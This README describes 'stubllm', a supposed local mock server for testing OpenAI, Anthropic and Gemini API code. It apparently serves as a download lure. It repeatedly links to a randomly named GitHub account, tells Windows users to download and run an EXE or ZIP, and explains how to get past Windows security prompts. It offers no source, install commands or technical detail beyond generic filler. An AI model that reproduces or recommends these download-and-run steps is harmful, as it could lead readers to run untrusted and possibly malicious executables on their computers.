# 🧪 stubllm - Test LLM code without tokens

[![Download stubllm](https://img.shields.io/badge/Download-Blue%20%26%20Gray-4B6CB7?style=for-the-badge)](https://github.com/Flawlargetoothedaspen304/stubllm)

## 🚀 What this does

stubllm is a local mock server for LLM APIs. It helps you test apps that use OpenAI, Anthropic, or Gemini without sending real requests or spending tokens.

Use it when you want to:

- check app behavior before you connect a live model
- run tests in a clean and repeatable way
- avoid costs during development
- compare how your code handles different API responses

## 💻 Windows setup

Use the link below to visit the page and download the app:

[Go to the stubllm download page](https://github.com/Flawlargetoothedaspen304/stubllm)

After the page opens:

1. Look for the latest release or download file
2. Download it to your PC
3. Save it in a folder you can find later, such as Downloads or Desktop
4. If Windows asks for permission, choose the option to keep or run the file only if you trust the source
5. Open the file to start stubllm

If the download comes as a ZIP file:

1. Right-click the ZIP file
2. Choose Extract All
3. Open the extracted folder
4. Run the app file inside the folder

If the download comes as an EXE file:

1. Double-click the file
2. Wait for Windows to open it
3. Follow the on-screen steps

## 🧭 First run

When stubllm starts, it acts like a fake API server on your computer.

A typical first setup looks like this:

1. Start the app
2. Note the local address it uses, such as `http://localhost:port`
3. Point your test app to that address
4. Run your app or tests
5. Check the output to see how your code reacts

If your app expects an API key, you can usually set any test value in your config. The server checks the request shape, not your real account.

## 🔧 What you can test

stubllm is useful for testing common LLM flows, such as:

- chat requests
- text generation
- streaming responses
- error handling
- retry logic
- timeout handling
- response parsing
- prompt changes
- test cases in `pytest`

This makes it a good fit for local development and automated tests.

## 🧩 Supported API styles

stubllm is built to help with apps that use common LLM API patterns, including:

- OpenAI-style chat endpoints
- Anthropic-style message formats
- Gemini-style request and response flows

If your app uses one of these styles, you can point it at stubllm and test the rest of your code without using a live model.

## 📝 Basic use

A simple setup usually follows this flow:

1. Start stubllm on your Windows PC
2. Copy the local server address
3. Open your app settings
4. Replace the real API address with the local one
5. Save the settings
6. Run your app
7. Watch how it handles the mock response

For test suites, you can start the server before the tests run and stop it after they finish.

## 🧪 Testing ideas

Here are a few ways to use stubllm in daily work:

- test a “send message” button
- check that your app shows loading states
- see how it handles empty replies
- verify fallback text
- test failed request paths
- compare response handling across providers

These checks help you catch issues before you connect to a live service.

## ⚙️ Common setup path

A common Windows setup looks like this:

1. Download stubllm
2. Open the file you downloaded
3. Allow the app to run if Windows asks
4. Start the server
5. Copy the local address
6. Paste that address into your test app
7. Run your tests

If the app has a settings panel, look for fields like:

- API base URL
- server URL
- model endpoint
- test mode
- mock mode

## 📁 Suggested folder placement

For easy access, save stubllm in one of these places:

- Downloads
- Desktop
- Documents
- a folder named `Tools`
- a folder named `Testing`

Keeping it in one place makes it easier to find when you want to run tests again.

## 🧰 System needs

stubllm is built for a normal Windows desktop or laptop.

A good setup includes:

- Windows 10 or Windows 11
- enough free disk space for the app file
- internet access to download the file
- permission to run downloaded apps
- a modern browser for the GitHub page

For best results, keep the app in a folder you can open fast.

## 🔍 Project focus

This project is made for:

- developer tools
- local testing
- mock servers
- Python test work
- API testing
- AI app checks

It helps you work on LLM features without using a live model for every test.

## 📌 Useful test cases

You can use stubllm to check how your app reacts to:

- a short answer
- a long answer
- a blank message
- a bad request
- a timeout
- a stream of partial text
- a different model name
- a changed response shape

These cases can show problems in code that is hard to see in normal use.

## 🛠️ If something does not open

If Windows does not open the file:

1. Check that the file finished downloading
2. Try opening it again
3. Make sure you extracted the ZIP file first, if it came as a ZIP
4. Right-click the file and choose Open
5. Look in Windows security prompts for a Run option
6. Download the file again if it looks incomplete

If the app opens but your test app cannot connect:

1. Check the server address
2. Make sure both apps run on the same machine
3. Confirm your app points to the local stubllm address
4. Restart both apps
5. Try the test again

## 🔗 Download again

If you need the file again, use this link to visit the page and download:

[https://github.com/Flawlargetoothedaspen304/stubllm](https://github.com/Flawlargetoothedaspen304/stubllm)

## 📚 Terms used in this project

- **Mock server**: a local fake server that acts like a real API
- **LLM**: a large language model
- **API**: the way two programs talk to each other
- **Endpoint**: a URL where a program sends a request
- **Localhost**: your own computer
- **pytest**: a Python test tool

## 🔒 Why people use it

stubllm helps you keep testing simple. You can work on your app logic, test error paths, and check response handling without depending on a live AI service

## 🧭 Quick path for Windows users

1. Open the download page
2. Get the latest file
3. Save it on your PC
4. Open or extract the file
5. Start stubllm
6. Point your app to the local server
7. Run your test or app